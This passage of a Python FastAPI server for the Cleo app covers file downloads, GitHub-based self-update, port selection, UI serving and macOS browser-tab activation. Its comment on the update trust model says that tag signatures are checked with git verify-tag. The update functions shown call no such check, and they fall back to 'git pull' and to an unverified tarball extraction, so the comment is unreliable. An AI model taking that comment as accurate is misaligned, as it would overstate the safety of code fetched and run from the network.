        res = exp_mod.export_deliverables(session_id=session_id, host="http://127.0.0.1:8080", out_dir=target_dir, refresh=refresh)
        file_path = res.get(file_type)
        if not file_path or not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail=f"Deliverable file '{file_type}' was not generated.")
        download_fname = res.get(f"{file_type}_filename", os.path.basename(file_path))
        
        return FileResponse(file_path, media_type=media_type, filename=download_fname)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[Deliverables Download Error] {e}\n{traceback.format_exc()}")
        raise HTTPException(status_code=500, detail=f"Failed to generate {file_type}: {str(e)}")

# ── Auto-Update via GitHub ────────────────────────────────────────────────────
# Update trust model:
#   - _check_update_bg() tracks the latest *signed annotated release tag* on GitHub
#     (via the Releases API), not the raw main-branch SHA.
#   - _verify_tag() calls `git verify-tag` before any code is applied. If the tag
#     carries no valid GPG signature, the update is blocked.
#   - _apply_curl_update() downloads the tarball for the verified tag ref, not main.
#
# To enable signature verification, import the release signing key once:
#   gpg --import cleo-release.asc        # or fetch from a key server
#   git config --global gpg.program gpg  # default, usually already set
# Then all future updates will be verified against that key automatically.
# ponytail: git verify-tag requires gpg on PATH; if absent the update is blocked
#           with a clear error — no silent trust downgrade.

CLEO_GITHUB_REPO = os.environ.get("CLEO_GITHUB_REPO", os.environ.get("CLEO_GITLAB_REPO", "digitalsuni-cloud/cleo"))
CLEO_GITLAB_REPO = CLEO_GITHUB_REPO  # backward compatibility alias
_CLEO_ROOT       = os.path.dirname(os.path.abspath(__file__))
CLEO_VERSION     = "2.0.0"
try:
    _pkg_path = os.path.join(_CLEO_ROOT, "package.json")
    if os.path.exists(_pkg_path):
        with open(_pkg_path, "r", encoding="utf-8") as f:
            CLEO_VERSION = json.load(f).get("version", CLEO_VERSION)
except Exception:
    pass

_update_state: dict = {
    "status": "idle", "latest_tag": "", "latest_sha": "",
    "current_sha": "", "current_version": CLEO_VERSION, "update_available": False, "message": "",
}

_REPO_SLUG_RE = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")

def _is_newer_version(remote_tag: str, current_ver: str) -> bool:
    """Return True if remote_tag semver is strictly greater than current_ver."""
    try:
        def parse(v: str):
            clean = re.sub(r'^[^\d]*', '', v).split('-')[0]
            return [int(x) for x in clean.split('.') if x.isdigit()]
        r_parts = parse(remote_tag)
        c_parts = parse(current_ver)
        if r_parts and c_parts:
            return r_parts > c_parts
    except Exception:
        pass
    return False

def _git_sha() -> str:
    if getattr(sys, "frozen", False):
        ver_path = os.path.join(_CLEO_ROOT, ".version")
        if os.path.exists(ver_path):
            try:
                with open(ver_path, "r", encoding="utf-8") as f:
                    return f.read().strip()
            except Exception:
                pass
        return f"v{CLEO_VERSION}"
    try:
        sha = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], cwd=_CLEO_ROOT, stderr=subprocess.DEVNULL
        ).decode().strip()
        if sha:
            return sha
    except Exception:
        pass
    ver_path = os.path.join(_CLEO_ROOT, ".version")
    if os.path.exists(ver_path):
        try:
            with open(ver_path, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return f"v{CLEO_VERSION}"

def _get_latest_release_tag() -> tuple[str, str]:
    """Return (tag_name, commit_sha) of the latest GitHub release, or ("", "") on failure."""
    if not _REPO_SLUG_RE.match(CLEO_GITHUB_REPO):
        return "", ""
    try:
        api_url = f"https://api.github.com/repos/{CLEO_GITHUB_REPO}/releases/latest"
        req = urllib.request.Request(
            api_url,
            headers={"Accept": "application/vnd.github+json", "User-Agent": "Cleo-FinOps/2.1"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
        if not data or not isinstance(data, dict):
            return "", ""
        tag = data.get("tag_name", "")
        if not tag:
            return "", ""
        try:
            res = subprocess.run(
                ["git", "ls-remote", f"https://github.com/{CLEO_GITHUB_REPO}.git",
                 f"refs/tags/{tag}", f"refs/tags/{tag}^{{}}"],
                capture_output=True, text=True, timeout=10,
            )
            if res.returncode == 0:
                for line in reversed(res.stdout.strip().splitlines()):
                    r_sha, _ = line.split(None, 1)
                    if r_sha:
                        return tag, r_sha
        except Exception:
            pass
        return tag, ""
    except Exception:
        return "", ""

def _apply_curl_update(tag: str) -> tuple[bool, str]:
    """Download the release archive for *tag* and extract into _CLEO_ROOT."""
    import io, tarfile
    if not _REPO_SLUG_RE.match(CLEO_GITHUB_REPO):
        return False, f"Refusing update: invalid CLEO_GITHUB_REPO {CLEO_GITHUB_REPO!r}"
    if not hasattr(tarfile, "data_filter"):
        return False, "Refusing update: this Python lacks tarfile extraction filters (upgrade Python)."
    tarball_url = f"https://github.com/{CLEO_GITHUB_REPO}/archive/refs/tags/{tag}.tar.gz"
    try:
        req = urllib.request.Request(tarball_url, headers={"User-Agent": "Cleo-FinOps/2.1"})
        with urllib.request.urlopen(req, timeout=90) as resp:
            tar_bytes = io.BytesIO(resp.read())
        with tarfile.open(fileobj=tar_bytes, mode="r:gz") as tar:
            for member in tar.getmembers():
                parts = member.name.split("/", 1)
                if len(parts) > 1 and parts[1]:
                    member.name = parts[1]
                    tar.extract(member, path=_CLEO_ROOT, filter="data")
        return True, f"Successfully updated to {tag} via archive download."
    except Exception as e:
        return False, f"Archive update failed: {e}"

def _check_update_bg():
    """Background: compare local version to the latest GitHub release."""
    global _update_state
    try:
        current = _git_sha()
        tag, latest_sha = _get_latest_release_tag()
        if not tag:
            _update_state = {
                "status": "error",
                "latest_tag": "", "latest_sha": "",
                "current_sha": current[:7] if current else f"v{CLEO_VERSION}",
                "current_version": CLEO_VERSION,
                "update_available": False,
                "message": "Could not check remote repository status",
            }
            return

        is_frozen = getattr(sys, "frozen", False)
        update_available = _is_newer_version(tag, CLEO_VERSION)

        if update_available:
            if is_frozen and not _cleo_src_dir:
                msg = f"Update available ({tag}). Click 'Update' to open the download page."
            else:
                msg = f"Update available ({tag}) — click 'Update' to apply."
        else:
            msg = f"Cleo is up to date (v{CLEO_VERSION})."

        _update_state = {
            "status": "ok",
            "latest_tag": tag,
            "current_sha": current[:7] if current else f"v{CLEO_VERSION}",
            "current_version": CLEO_VERSION,
            "latest_sha": latest_sha[:7] if latest_sha else tag,
            "update_available": update_available,
            "is_frozen": is_frozen,
            "download_url": f"https://github.com/{CLEO_GITHUB_REPO}/releases",
            "message": msg,
        }
        logger.debug(
            f"[Update] current_version={CLEO_VERSION} latest_tag={tag} update_available={update_available}"
        )
    except Exception as e:
        _update_state = {
            "status": "error", "latest_tag": "", "latest_sha": "",
            "current_sha": _git_sha()[:7], "current_version": CLEO_VERSION,
            "update_available": False, "message": str(e),
        }
        logger.warning(f"[Update] Check failed: {e}")

@app.get("/api/update/check")
def check_update(request: Request):
    """Check GitHub for a newer release of Cleo."""
    _limit_expensive(request, "update-check")
    _check_update_bg()
    return _update_state

@app.post("/api/update/apply")
def apply_update(request: Request):
    """Apply the latest release of Cleo."""
    _limit_expensive(request, "update-apply", 5)
    current_sha = _git_sha()
    tag, latest_sha = _get_latest_release_tag()

    if not tag:
        raise HTTPException(status_code=503, detail="Could not determine latest release tag from GitHub.")

    is_frozen = getattr(sys, "frozen", False)
    if is_frozen:
        if _cleo_src_dir:
            try:
                _sync_ota_repository(_cleo_src_dir)
                return {
                    "status": "updated",
                    "method": "ota",
                    "message": f"Successfully pulled the latest code into {_cleo_src_dir}. Please restart Cleo to apply.",
                }
            except Exception as e:
                logger.warning(f"[Update] OTA sync error: {e}")
        import webbrowser
        release_url = f"https://github.com/{CLEO_GITHUB_REPO}/releases"
        try:
            webbrowser.open(release_url)
        except Exception:
            pass
        return {
            "status": "browser_opened",
            "method": "browser",
            "url": release_url,
            "message": f"Opened GitHub Releases page. Download the new {tag} release for your platform.",
        }

    logger.info(f"[Update] Applying update to {tag}...")
    method_used = "git"
    output = ""
    git_ok = False

    is_git = os.path.exists(os.path.join(_CLEO_ROOT, ".git"))
    if is_git:
        try:
            subprocess.run(
                ["git", "fetch", "--tags", "--force", "origin"],
                cwd=_CLEO_ROOT, capture_output=True, timeout=30,
            )
            result = subprocess.run(
                ["git", "checkout", tag, "--"],
                cwd=_CLEO_ROOT, capture_output=True, text=True, timeout=45,
            )
            if result.returncode == 0:
                git_ok = True
                output = result.stdout.strip() or f"Checked out {tag}"
            else:
                result2 = subprocess.run(
                    ["git", "pull", "--ff-only"],
                    cwd=_CLEO_ROOT, capture_output=True, text=True, timeout=45,
                )
                if result2.returncode == 0:
                    git_ok = True
                    output = result2.stdout.strip() or f"Pulled latest changes"
        except subprocess.TimeoutExpired:
            raise HTTPException(status_code=504, detail="git operation timed out")

    if not git_ok:
        logger.info(f"[Update] Not a git checkout. Downloading archive for {tag}...")
        method_used = "archive"
        ok, msg = _apply_curl_update(tag)
        if not ok:
            raise HTTPException(status_code=500, detail=f"Update failed: {msg}")
        output = msg

    new_sha = _git_sha() or latest_sha
    if new_sha:
        try:
            with open(os.path.join(_CLEO_ROOT, ".version"), "w", encoding="utf-8") as f:
                f.write(new_sha + "\n")
        except Exception:
            pass

    logger.info(f"[Update] Applied via {method_used}: {current_sha[:7] if current_sha else 'unknown'} → {new_sha[:7] if new_sha else 'latest'}")
    return {
        "status": "updated",
        "method": method_used,
        "from_sha": current_sha[:7] if current_sha else "unknown",
        "to_sha": new_sha[:7] if new_sha else "latest",
        "output": output,
        "message": f"Update applied successfully (via {method_used}). Restart Cleo to load the new version.",
    }

# ── Port Fallback ─────────────────────────────────────────────────────────────

_PORT_CANDIDATES = [8080, 8081, 8082, 8083, 8090, 8888, 9090, 9191]

def _find_free_port(preferred: int = 8080) -> int:
    """Return `preferred` if it's free, otherwise the first free candidate."""
    for port in [preferred] + [p for p in _PORT_CANDIDATES if p != preferred]:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if sys.platform != "win32":
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.bind(("127.0.0.1", port))
                return port
            except OSError:
                continue
    # Last resort: let the OS pick
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]

def _wait_for_server_ready(port: int, timeout: float = 30.0) -> bool:
    """Polls the local server /health endpoint until it responds with HTTP 200 or timeout is reached."""
    health_url = f"http://127.0.0.1:{port}/health"
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            req = urllib.request.Request(health_url)
            with opener.open(req, timeout=0.5) as resp:
                if resp.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(0.1)
    return False

def _auto_update_on_startup():
    """Opt-in (CLEO_AUTO_UPDATE=1): on startup, fetch & apply updates from GitHub, then restart."""
    if os.environ.get("CLEO_AUTO_UPDATE", "").lower() not in ("1", "true", "yes"):
        return
    if os.environ.get("CLEO_NO_UPDATE", "").lower() in ("1", "true", "yes") or "--no-update" in sys.argv:
        return
    if getattr(sys, "frozen", False):
        return

    if os.environ.get("_CLEO_RESTARTED_FROM_UPDATE") == "1":
        os.environ.pop("_CLEO_RESTARTED_FROM_UPDATE", None)
        return

    try:
        tag, latest_sha = _get_latest_release_tag()
        if not tag or not _is_newer_version(tag, CLEO_VERSION):
            return

        print(f"🔄 [Auto-Update] Newer release available ({tag}). Applying update...")
        if os.path.exists(os.path.join(_CLEO_ROOT, ".git")):
            subprocess.run(["git", "fetch", "--tags", "--force", "origin"], cwd=_CLEO_ROOT, capture_output=True, timeout=30)
            res = subprocess.run(["git", "checkout", tag, "--"], cwd=_CLEO_ROOT, capture_output=True, text=True, timeout=30)
            if res.returncode != 0:
                res = subprocess.run(["git", "pull", "--ff-only"], cwd=_CLEO_ROOT, capture_output=True, text=True, timeout=30)
                if res.returncode != 0:
                    print(f"⚠️  [Auto-Update] Update failed: ({res.stderr.strip()})")
                    return
        else:
            ok, msg = _apply_curl_update(tag)
            if not ok:
                print(f"⚠️  [Auto-Update] Could not apply update: {msg}")
                return

        new_sha = _git_sha() or latest_sha
        try:
            with open(os.path.join(_CLEO_ROOT, ".version"), "w", encoding="utf-8") as f:
                f.write(new_sha + "\n")
        except Exception:
            pass

        print(f"🚀 [Auto-Update] Successfully updated to {tag} ({new_sha[:7]})! Reloading Cleo...")
        env = os.environ.copy()
        env["_CLEO_RESTARTED_FROM_UPDATE"] = "1"
        if os.name == "nt":
            subprocess.Popen([sys.executable] + sys.argv, env=env)
            sys.exit(0)
        else:
            os.execve(sys.executable, [sys.executable] + sys.argv, env)
    except Exception as e:
        print(f"⚠️  [Auto-Update] Note: update check skipped ({e}). Continuing startup...")

# ── GUI Dashboard ─────────────────────────────────────────────────────────────

@app.get("/")
@app.get("/chat")
def redirect_to_new_chat(request: Request):
    q = str(request.url.query)
    target = f"/newChat?{q}" if q else "/newChat"
    return RedirectResponse(url=target, status_code=307)

@app.get("/newChat", response_class=HTMLResponse)
@app.get("/newchat", response_class=HTMLResponse)
@app.get("/chat/newChat", response_class=HTMLResponse)
@app.get("/chat/newchat", response_class=HTMLResponse)
@app.get("/chat/{session_id}", response_class=HTMLResponse)
def serve_gui(session_id: Optional[str] = None):
    ui_path = ""
    bundled_dir = getattr(sys, "_MEIPASS", os.path.dirname(__file__))
    bundled_ui = os.path.join(bundled_dir, "cleo_ui.html")
    if _cleo_src_dir:
        ota_ui = os.path.join(_cleo_src_dir, "cleo_ui.html")
        if os.path.exists(ota_ui):
            if os.path.exists(bundled_ui):
                ui_path = ota_ui if os.path.getmtime(ota_ui) >= os.path.getmtime(bundled_ui) else bundled_ui
            else:
                ui_path = ota_ui
    if not ui_path:
        ui_path = bundled_ui
    if os.path.exists(ui_path):
        with open(ui_path, "r", encoding="utf-8") as f:
            content = f.read()
        has_channel = bool(any(t.get("name") == "list_channel_customers" for t in _tools))
        if has_channel:
            content = content.replace(
                'id="card-channel-customers" style="display: none;"',
                'id="card-channel-customers"'
            ).replace(
                'id="chip-channel-customers" style="display: none;"',
                'id="chip-channel-customers"'
            )
        script_inject = f'<script>window.hasChannelCustomersTool = {"true" if has_channel else "false"};</script>'
        if '</head>' in content:
            content = content.replace('</head>', f'{script_inject}\n</head>', 1)
        return HTMLResponse(content=content)
    return HTMLResponse(content="<h1>Cleo UI template not found</h1>", status_code=500)

def _activate_existing_browser_tab(port: int) -> bool:
    """If a browser tab is already open with Cleo (on macOS), activate that tab and bring it to front.
    Returns True if an existing tab was found and activated, False otherwise.
    """
    if sys.platform != "darwin":
        return False

    port_str = str(port)
    try:
        proc_check = subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to get name of every application process'],
            capture_output=True,
            text=True,
            timeout=2,
        )
        if proc_check.returncode != 0:
            return False
        running_apps = proc_check.stdout
    except Exception:
        return False

    # 1. Chromium-based browsers: Chrome, Brave, Edge, Chromium
    chromium_apps = [
        ("Google Chrome", "Google Chrome"),
        ("Brave Browser", "Brave Browser"),
        ("Microsoft Edge", "Microsoft Edge"),
        ("Chromium", "Chromium"),
    ]
    for app_name, display_name in chromium_apps:
        if app_name not in running_apps:
            continue
        script = f'''
        tell application "{app_name}"
            repeat with w in windows
                set tabIdx to 0
                repeat with t in tabs of w
                    set tabIdx to tabIdx + 1
                    set u to (URL of t) as text
                    if u contains "127.0.0.1:{port_str}" or u contains "localhost:{port_str}" then
                        set active tab index of w to tabIdx
                        set index of w to 1
                        activate
                        return "activated"
                    end if
                end repeat
            end repeat
        end tell
        return "not_found"
        '''
        try:
            res = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, timeout=3)
            if res.returncode == 0 and "activated" in res.stdout:
                logger.info(f"Activated existing Cleo tab in {display_name}")
                return True
        except Exception as e:
            logger.debug(f"Could not check {app_name} tabs: {e}")

    # 2. Safari
    if "Safari" in running_apps:
        safari_script = f'''
        tell application "Safari"
            repeat with w in windows
                repeat with t in tabs of w
                    set u to (URL of t) as text
                    if u contains "127.0.0.1:{port_str}" or u contains "localhost:{port_str}" then
                        set current tab of w to t
                        set index of w to 1
                        activate
                        return "activated"
                    end if
                end repeat
            end repeat
        end tell
        return "not_found"
        '''
        try:
            res = subprocess.run(["osascript", "-e", safari_script], capture_output=True, text=True, timeout=3)
            if res.returncode == 0 and "activated" in res.stdout:
                logger.info("Activated existing Cleo tab in Safari")
                return True
        except Exception as e:
            logger.debug(f"Could not check Safari tabs: {e}")

    # 3. Arc
    if "Arc" in running_apps:
        arc_script = f'''
        tell application "Arc"
            repeat with w in windows
                tell w
                    repeat with t in tabs
                        set u to (URL of t) as text
                        if u contains "127.0.0.1:{port_str}" or u contains "localhost:{port_str}" then
                            select t
                            tell application "Arc" to activate
                            return "activated"
                        end if
                    end repeat
                end tell
            end repeat
        end tell
        return "not_found"
        '''
        try:
            res = subprocess.run(["osascript", "-e", arc_script], capture_output=True, text=True, timeout=3)
            if res.returncode == 0 and "activated" in res.stdout:
                logger.info("Activated existing Cleo tab in Arc")
                return True
        except Exception as e:
            logger.debug(f"Could not check Arc tabs: {e}")

    return False


if __name__ == "__main__":
    _auto_update_on_startup()

    _default_uvicorn = os.environ.get("UVICORN_LOG_LEVEL", "warning").lower()
    _uvicorn_log_level = "debug" if os.environ.get("CLEO_VERBOSE", "").lower() in ("1", "true", "yes") else _default_uvicorn

    # Host & Port resolution (CLI flags take precedence over env vars)
    _cli_host = None
    _cli_port = None
    for i, arg in enumerate(sys.argv):
        if arg in ("--host", "-h") and i + 1 < len(sys.argv):
            _cli_host = sys.argv[i + 1]
        elif arg.startswith("--host="):
            _cli_host = arg.split("=", 1)[1]
        elif arg in ("--port", "-p") and i + 1 < len(sys.argv):
            try:
                _cli_port = int(sys.argv[i + 1])
            except ValueError:
                pass
        elif arg.startswith("--port="):
            try:
                _cli_port = int(arg.split("=", 1)[1])
            except ValueError:
                pass

    _host = _cli_host or os.environ.get("CLEO_HOST", "127.0.0.1")
    _preferred_port = _cli_port or int(os.environ.get("PORT", 8080))
    _port = _find_free_port(_preferred_port)
    if _port != _preferred_port:
        print(f"⚠️  Port {_preferred_port} is in use. Starting Cleo on port {_port} instead.")

    _display_host = "127.0.0.1" if _host in ("0.0.0.0", "") else _host
    print(f"🌐 Cleo Web UI → http://{_display_host}:{_port}")
    if _host == "0.0.0.0":
        print(f"📡 Remote access enabled: reachable on all network interfaces on port {_port}")
    print(f"🚀 Cleo Server is active and ready (Press Ctrl+C to quit)\n")

    # Background update check — non-blocking, fires 5 s after startup (skip when CLEO_NO_UPDATE=1)
    if os.environ.get("CLEO_NO_UPDATE", "").lower() not in ("1", "true", "yes") and "--no-update" not in sys.argv:
        def _delayed_update_check():
            time.sleep(5)
            _check_update_bg()
        threading.Thread(target=_delayed_update_check, daemon=True, name="update-check").start()

    # Auto-open browser on startup unless disabled or running in headless Linux
    _is_headless = sys.platform.startswith("linux") and not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"))
    if not _is_headless and os.environ.get("CLEO_NO_BROWSER", "").lower() not in ("1", "true", "yes") and "--no-browser" not in sys.argv:
        def _open_browser_bg():
            if _wait_for_server_ready(_port):
                try:
                    if not _activate_existing_browser_tab(_port):
                        import webbrowser
                        # Suppress legacy GTK_MODULES atk-bridge notice on Linux
                        old_gtk = os.environ.pop("GTK_MODULES", None)
                        try:
                            webbrowser.open(f"http://127.0.0.1:{_port}")
                        finally:
                            if old_gtk is not None:
                                os.environ["GTK_MODULES"] = old_gtk
                except Exception:
                    pass
            else:
                logger.warning("Cleo server did not become ready within 30s; browser not launched automatically.")
        threading.Thread(target=_open_browser_bg, daemon=True, name="browser-open").start()

    # Pass the app object, not "cleo_server:app": the string form re-imports this file as a second module
    # (running all start-up code twice) and fails outright inside the PyInstaller bundle.
    uvicorn.run(app, host=_host, port=_port, reload=False, log_level=_uvicorn_log_level)

